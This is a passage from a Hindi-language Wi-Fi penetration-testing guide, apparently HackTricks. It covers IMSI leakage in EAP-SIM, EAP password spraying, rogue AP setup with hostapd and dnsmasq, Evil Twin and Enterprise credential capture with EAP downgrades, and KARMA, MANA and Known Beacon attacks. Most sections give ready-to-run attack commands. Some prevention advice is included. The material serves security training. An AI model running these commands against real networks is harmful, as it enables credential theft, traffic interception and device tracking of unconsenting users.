# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

नोट्स:
- यदि deployment bare EAP‑SIM/AKA का उपयोग करता है और protected identity/pseudonyms नहीं हैं, तो यह किसी भी TLS टनल से पहले काम करता है।
- प्रकाशित मान एक स्थायी पहचानकर्ता है जो subscriber के SIM से जुड़ा होता है; harvesting लंबे समय तक tracking और downstream telecom abuses की अनुमति देता है।

प्रभाव
- गोपनीयता: सार्वजनिक स्थानों में passive Wi‑Fi कैप्चर्स से persistent user/device ट्रैकिंग।
- Telecom abuse bootstrap: IMSI के साथ, SS7/Diameter access वाला एक हमलावर location पूछताछ कर सकता है या कॉल/SMS interception और MFA theft का प्रयास कर सकता है।

रोकथाम / क्या देखना चाहिए
- सत्यापित करें कि clients EAP‑SIM/AKA के लिए anonymous outer identities (pseudonyms) का उपयोग कर रहे हैं जैसा कि 3GPP guidance में दिया गया है (उदा., 3GPP TS 33.402)।
- पहचान चरण को tunneling करना प्राथमिकता दें (उदा., EAP‑TTLS/PEAP जो inner EAP‑SIM/AKA को carry करता है) ताकि IMSI कभी clear में न भेजा जाए।
- association/auth के packet captures में कभी भी raw IMSI EAP-Response/Identity में प्रकट नहीं होना चाहिए।

Related: कैप्चर किए गए मोबाइल पहचानकर्ताओं के साथ Telecom signalling exploitation
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

यदि क्लाइंट से उम्मीद की जाती है कि वे एक **username and password** का उपयोग करें (ध्यान दें कि **EAP-TLS मान्य नहीं होगा** इस स्थिति में), तो आप **usernames** की एक **list** प्राप्त करने की कोशिश कर सकते हैं (अगले भाग को देखें) और **passwords** हासिल करके access को **bruteforce** करने का प्रयास कर सकते हैं [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
आप यह हमला `eaphammer` का उपयोग करके भी कर सकते हैं:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## क्लाइंट हमले सिद्धांत

### नेटवर्क चयन और रोमिंग

- 802.11 प्रोटोकॉल यह परिभाषित करता है कि एक station कैसे एक Extended Service Set (ESS) से जुड़ता है, लेकिन यह यह निर्दिष्ट नहीं करता कि किसी ESS या उसके भीतर किसी access point (AP) के चयन के लिए मानदंड क्या होंगे।
- Stations एक ही ESSID साझा करने वाले APs के बीच roam कर सकते हैं, जिससे एक बिल्डिंग या क्षेत्र में connectivity बनी रहती है।
- प्रोटोकॉल station द्वारा ESS के प्रति authentication की आवश्यकता रखता है, लेकिन यह AP द्वारा station के प्रति authentication को अनिवार्य नहीं करता।

### Preferred Network Lists (PNLs)

- Stations हर wireless network का ESSID जिसमें वे connect होते हैं, अपनी Preferred Network List (PNL) में स्टोर करते हैं, साथ ही network-specific configuration विवरण भी।
- PNL का उपयोग ज्ञात नेटवर्कों से स्वचालित रूप से जुड़ने के लिए किया जाता है, जिससे connection प्रक्रिया सरल होकर उपयोगकर्ता का अनुभव बेहतर होता है।

### Passive Scanning

- APs समय-समय पर beacon frames broadcast करते हैं, अपनी उपस्थिति और सुविधाएँ घोषणा करते हुए, जिसमें AP का ESSID शामिल है, जब तक कि broadcasting disabled न हो।
- Passive scanning के दौरान, stations beacon frames के लिए सुनते हैं। यदि किसी beacon का ESSID station की PNL में किसी entry से मेल खाता है, तो station स्वचालित रूप से उस AP से जुड़ सकता है।
- किसी डिवाइस की PNL का ज्ञान संभावित exploitation की अनुमति देता है: ज्ञात नेटवर्क के ESSID की नकल करके डिवाइस को एक rogue AP से कनेक्ट करने के लिए बहकाया जा सकता है।

### Active Probing

- Active probing में stations probe requests भेजते हैं ताकि आसपास के APs और उनकी विशेषताओं का पता लगाया जा सके।
- Directed probe requests किसी विशिष्ट ESSID को टार्गेट करते हैं, जिससे यह पता लगाने में मदद मिलती है कि कोई विशेष नेटवर्क रेंज में है या नहीं, भले ही वह hidden network हो।
- Broadcast probe requests में null SSID field होती है और इन्हें सभी निकटवर्ती APs को भेजा जाता है, जिससे station बिना अपनी PNL की सामग्री प्रकट किए किसी भी preferred network के लिए जांच कर सकता है।

## Simple AP with redirection to Internet

अधिक जटिल attacks करने का तरीका समझाने से पहले यह बताया जाएगा कि कैसे सिर्फ़ एक **AP** बनाया जाए और उसका ट्रैफ़िक उस interface पर redirect किया जाए जो **Internet** से जुड़ा हुआ है।

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
कॉन्फ़िग फ़ाइल बनाएँ `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
फिर **set IPs** और **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
और फिर **शुरू करें** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
एक config file बनाएं `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**परेशान करने वाली प्रक्रियाओं को बंद करें** , सेट करें **monitor mode**, और **शुरू करें hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### फ़ॉरवर्डिंग और रीडायरेक्शन
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Evil twin attack WiFi क्लाइंट्स के नेटवर्क पहचानने के तरीके का फायदा उठाता है, जो मुख्य रूप से नेटवर्क नाम (ESSID) पर निर्भर करता है और base station (access point) को क्लाइंट के समक्ष प्रमाणित करने की आवश्यकता नहीं रखता। मुख्य बिंदु:

- **पहचान में कठिनाई**: डिवाइस वैध और rogue access points के बीच अंतर करने में संघर्ष करते हैं जब वे एक ही ESSID और एन्क्रिप्शन प्रकार साझा करते हैं। वास्तविक दुनिया के नेटवर्क अक्सर बिना व्यवधान के कवरेज बढ़ाने के लिए एक ही ESSID वाले कई access points का उपयोग करते हैं।
- **क्लाइंट रोमिंग और कनेक्शन मैनीपुलेशन**: 802.11 प्रोटोकॉल डिवाइसों को एक ही ESS के भीतर access points के बीच roam करने की अनुमति देता है। हमलावर इसका फायदा उठाकर किसी डिवाइस को उसके वर्तमान base station से disconnect करवा कर उसे rogue access point से connect करवा सकते हैं। यह या तो मजबूत सिग्नल ऑफर करके या वैध access point के कनेक्शन को deauthentication packets या jamming जैसी विधियों से बाधित करके हासिल किया जा सकता है।
- **कार्यान्वयन में चुनौतियाँ**: कई और अच्छी तरह से स्थित access points वाले वातावरण में सफलतापूर्वक एक evil twin attack करना चुनौतीपूर्ण हो सकता है। एक अकेले वैध access point को deauthenticate करने पर अक्सर डिवाइस किसी दूसरे वैध access point से जुड़ जाता है, जब तक कि हमलावर सभी नज़दीकी access points को deauthenticate न कर सके या रणनीतिक रूप से rogue access point न रखे।

आप निम्नलिखित करके एक बहुत बुनियादी Open Evil Twin बना सकते हैं (Internet पर ट्रैफ़िक रूट करने की कोई क्षमता नहीं):
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
आप **eaphammer** का उपयोग करके एक Evil Twin भी बना सकते हैं (ध्यान दें कि eaphammer के साथ evil twins बनाने के लिए इंटरफ़ेस को **monitor** मोड में **न होना चाहिए**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
या Airgeddon का उपयोग करके: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

कृपया ध्यान दें कि डिफ़ॉल्ट रूप से यदि PNL में कोई ESSID WPA के रूप में सेव है, तो डिवाइस स्वचालित रूप से किसी Open evil Twin से कनेक्ट नहीं करेगा। आप असली AP पर DoS करके आशा कर सकते हैं कि उपयोगकर्ता मैन्युअल रूप से आपके Open evil twin से कनेक्ट कर लेगा, या आप असली AP पर DoS करके एक WPA Evil Twin का उपयोग करके handshake कैप्चर कर सकते हैं (इस तरीके से आप पीड़ित को अपने साथ कनेक्ट नहीं कर पाएँगे क्योंकि आप PSK नहीं जानते, लेकिन आप handshake कैप्चर कर सकते हैं और इसे क्रैक करने की कोशिश कर सकते हैं)।

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

आप एक **Evil Twin using WPA/2** बना सकते हैं और अगर डिवाइस उस SSID से WPA/2 के साथ कनेक्ट करने के लिए कॉन्फ़िगर हैं, तो वे कनेक्ट करने की कोशिश करेंगे। फिर भी, **to complete the 4-way-handshake** करने के लिए आपको वह **password** भी **know** होना चाहिए जो क्लाइंट इस्तेमाल करने जा रहा है। अगर आप **don't know** it, तो **connection won't be completed**।
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

इन हमलों को समझने के लिए, मैं सलाह दूंगा कि पहले संक्षेप में [WPA Enterprise explanation](#wpa-enterprise-mgt) पढ़ लें।

**hostapd-wpe का उपयोग**

`hostapd-wpe` को काम करने के लिए एक **कॉन्फ़िगरेशन** फ़ाइल की आवश्यकता होती है। इन कॉन्फ़िगरेशनों के निर्माण को **ऑटोमेट** करने के लिए आप [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) का उपयोग कर सकते हैं (_/etc/hostapd-wpe/_ के अंदर python फ़ाइल डाउनलोड करें)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
कॉन्फ़िगरेशन फ़ाइल में आप कई अलग‑अलग चीज़ें चुन सकते हैं, जैसे ssid, channel, user files, cret/key, dh parameters, wpa version and auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**EAPHammer का उपयोग**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
डिफ़ॉल्ट रूप से, EAPHammer इन authentication methods का उपयोग करता है (ध्यान दें कि GTC को सबसे पहले plaintext passwords प्राप्त करने के लिए आज़माया जाता है और फिर अधिक robust auth methods का उपयोग किया जाता है):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
यह लंबी कनेक्शन समय से बचने के लिए डिफ़ॉल्ट कार्यप्रणाली है। हालाँकि, आप server को authentication methods को सबसे कमजोर से सबसे मजबूत तक निर्दिष्ट भी कर सकते हैं:
```
--negotiate weakest
```
या आप निम्नलिखित का भी उपयोग कर सकते हैं:

- `--negotiate gtc-downgrade` उच्च कुशल GTC downgrade implementation (plaintext passwords) का उपयोग करने के लिए
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` प्रस्तावित विधियों को मैन्युअली निर्दिष्ट करने के लिए (संगठन द्वारा उपयोग की जाने वाली वही auth methods और उसी क्रम में ऑफर करने से हमला पकड़ना बहुत कठिन होगा).
- [विकि में अधिक जानकारी देखें](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Airgeddon का उपयोग**

`Airgeddon` पहले से जनरेट किए गए certificated का उपयोग कर सकता है ताकि WPA/WPA2-Enterprise नेटवर्क्स को EAP authentication प्रदान कर सके। फेक नेटवर्क connection protocol को EAP-MD5 में downgrade कर देगा ताकि यह **user और password के MD5 को capture कर सके**। बाद में, attacker password crack करने की कोशिश कर सकता है.\
`Airggedon` आपको लगातार **Evil Twin attack (noisy)** या केवल तब तक **Evil Attack बनाए रखने (smooth)** की संभावना देता है जब तक कोई कनेक्ट न हो।

![](<../../images/image (936).png>)

### Evil Twins attacks में PEAP और EAP-TTLS TLS टनलों की डिबगिंग

_यह तरीका PEAP कनेक्शन में परखा गया था लेकिन क्योंकि मैं किसी भी arbitrary TLS tunnel को decrypt कर रहा हूँ, यह EAP-TTLS पर भी काम करना चाहिए_

hostapd-wpe की **configuration** के अंदर उस लाइन को **comment** करें जो _**dh_file**_ को शामिल करती है (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\  
इससे `hostapd-wpe` DH के बजाय **RSA का उपयोग करके keys exchange** करेगा, ताकि आप बाद में सर्वर के private key को जानकर ट्रैफ़िक **decrypt** कर सकें।

अब उस संशोधित configuration के साथ सामान्यतः की तरह **Evil Twin** शुरू करें उपयोग करके **`hostapd-wpe`**। साथ ही, उस **interface** पर **`wireshark`** भी शुरू करें जो Evil Twin attack कर रहा है।

अब या बाद में (जब आपने कुछ authentication intents capture कर लिए हों) आप private RSA key को wireshark में जोड़ सकते हैं: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

एक नया entry जोड़ें और फॉर्म भरें इन मानों के साथ: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**अपनी key file चुनें**, समस्याओं से बचने के लिए ऐसी key file चुनें **जो password protected न हो**).

![](<../../images/image (687).png>)

और नए **"Decrypted TLS" tab** को देखें:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID और MAC ब्लैक/व्हाइटलिस्ट

Media Access Control Filter Lists (MFACLs) के विभिन्न प्रकार और उनके संबंधित मोड्स और rogue Access Point (AP) के व्यवहार पर प्रभाव:

1. **MAC-based Whitelist**:
- rogue AP केवल उन devices से आने वाले probe requests का जवाब देगा जो whitelist में निर्दिष्ट हैं, और सूचीबद्ध न होने वाले अन्य सभी डिवाइसेज़ के लिए अदृश्य रहेगा।
2. **MAC-based Blacklist**:
- rogue AP blacklist में मौजूद devices से आने वाले probe requests को अनदेखा करेगा, जिससे वह उन विशिष्ट डिवाइसेज़ के लिए प्रभावी रूप से अदृश्य बन जाएगा।
3. **SSID-based Whitelist**:
- rogue AP केवल सूचीबद्ध विशिष्ट ESSIDs के लिए probe requests का जवाब देगा, जिससे वह उन डिवाइसेज़ के लिए अदृश्य रहेगा जिनकी Preferred Network Lists (PNLs) में वे ESSIDs नहीं हैं।
4. **SSID-based Blacklist**:
- rogue AP blacklist में मौजूद विशिष्ट ESSIDs के लिए probe requests का जवाब नहीं देगा, जिससे वह उन डिवाइसेज़ के लिए अदृश्य बन जाएगा जो उन विशेष नेटवर्क्स की तलाश कर रहे हैं।
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

This method allows an **attacker to create a malicious access point (AP) that responds to all probe requests** from devices seeking to connect to networks. This technique **tricks devices into connecting to an attacker's AP** by mimicking the networks the devices are searching for. Once a device sends a connection request to this rogue AP, it completes the connection, leading the device to mistakenly connect to the attacker's network.

### MANA

Then, **devices started to ignore unsolid network responses**, reducing the effectiveness of the original karma attack. However, a new method, known as the **MANA attack**, was introduced by Ian de Villiers and Dominic White. This method involves the rogue AP **capturing the Preferred Network Lists (PNL) from devices by responding to their broadcast probe requests** with network names (SSIDs) previously solid by the devices. This sophisticated attack bypasses the protections against the original karma attack by exploiting the way devices remember and prioritize known networks.

The MANA attack operates by monitoring both directed and broadcast probe requests from devices. For directed requests, it records the device's MAC address and the requested network name, adding this information to a list. When a broadcast request is received, the AP responds with information matching any of the networks on the device's list, enticing the device to connect to the rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** एक उन्नत रणनीति है जब डिवाइस directed probing का उपयोग नहीं करते हैं या जब उनके Preferred Network Lists (PNL) हमलावर के लिए अज्ञात होते हैं।

यह उस सिद्धांत पर चलता है कि **इसी क्षेत्र में मौजूद डिवाइसों के PNLs में कुछ नेटवर्क नाम साझा होने की संभावना रहती है**।

चुनिंदा रूप से प्रतिक्रिया देने के बजाय, यह attack सभी देखे गए डिवाइसों की संयुक्त PNLs में पाए जाने वाले हर नेटवर्क नाम (ESSID) के लिए probe responses प्रसारित करता है।

यह व्यापक तरीका किसी डिवाइस के परिचित नेटवर्क को पहचानने और rogue Access Point (AP) से जुड़ने का प्रयास करने की संभावना बढ़ा देता है।
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

जब **Loud MANA attack** पर्याप्त नहीं हो सकता, तो **Known Beacon attack** एक अलग तरीका पेश करता है। यह तरीका **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** (ये सूची एक wordlist से ली जाती है)। यह कई networks की उपस्थिति का simulate करता है, यह उम्मीद करते हुए कि victim के PNL में कोई ESSID मैच हो जाए, जिससे fabricated AP के साथ connection का प्रयास प्रेरित हो। Attack को और aggressive बनाने के लिए इसे `--loud` option के साथ combine किया जा सकता है ताकि devices को फंसाने की कोशिश और तीव्र हो।

Eaphammer ने इस attack को MANA attack के रूप में implement किया है जहाँ सूची के अंदर सभी ESSIDs को charged किया जाता है (आप इसे `--loud` के साथ combine करके Loud MANA + Known beacons attack भी बना सकते हैं):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

The **Known Beacon Burst attack** involves **फ़ाइल में सूचीबद्ध प्रत्येक ESSID के लिए beacon frames का तीव्र प्रसारण**. यह नकली नेटवर्क्स का एक घना वातावरण बनाता है, जिससे rogue AP से डिवाइसों के जुड़ने की संभावना बहुत बढ़ जाती है, खासकर जब इसे MANA attack के साथ मिलाया जाता है। यह तकनीक गति और मात्रा का उपयोग करके डिवाइसों के नेटवर्क चयन तंत्र को अभिभूत कर देती है।
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** एक प्रोटोकॉल है जो डिवाइसों को पारंपरिक वायरलेस एक्सेस पॉइंट की आवश्यकता के बिना Wi-Fi का उपयोग करके सीधे एक-दूसरे से जुड़ने में सक्षम बनाता है। यह क्षमता विभिन्न Internet of Things (IoT) डिवाइसों में सम्मिलित है, जैसे प्रिंटर और टेलीविजन, जो सीधे डिवाइस-से-डिवाइस संचार की सुविधा प्रदान करते हैं। Wi-Fi Direct की एक प्रमुख विशेषता यह है कि एक डिवाइस कनेक्शन का प्रबंधन करने के लिए एक access point की भूमिका अपनाता है, जिसे group owner कहा जाता है।

Wi-Fi Direct कनेक्शनों की सुरक्षा **Wi-Fi Protected Setup (WPS)** के माध्यम से स्थापित होती है, जो सुरक्षित पेयरिंग के लिए कई विधियों का समर्थन करता है, जिनमें शामिल हैं:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

ये विधियाँ, विशेष रूप से PIN entry, पारंपरिक Wi-Fi नेटवर्कों में WPS जैसी कमजोरियों के प्रति संवेदनशील हैं, जिससे वे समान attack vectors के लक्ष्य बनती हैं।

### EvilDirect Hijacking

**EvilDirect Hijacking** Wi-Fi Direct के लिए विशेष एक attack है। यह Evil Twin attack की अवधारणा को प्रतिबिंबित करता है लेकिन Wi-Fi Direct कनेक्शनों को लक्षित करता है। इस परिदृश्य में, एक attacker वैध group owner का impersonate करता है ताकि डिवाइसों को एक malicious entity से जुड़ने के लिये धोखा दिया जा सके। यह तरीका `airbase-ng` जैसे टूल का उपयोग करके निष्पादित किया जा सकता है, जिसमें impersonated डिवाइस का channel, ESSID, और MAC address निर्दिष्ट किया जाता है:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: देखें: [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
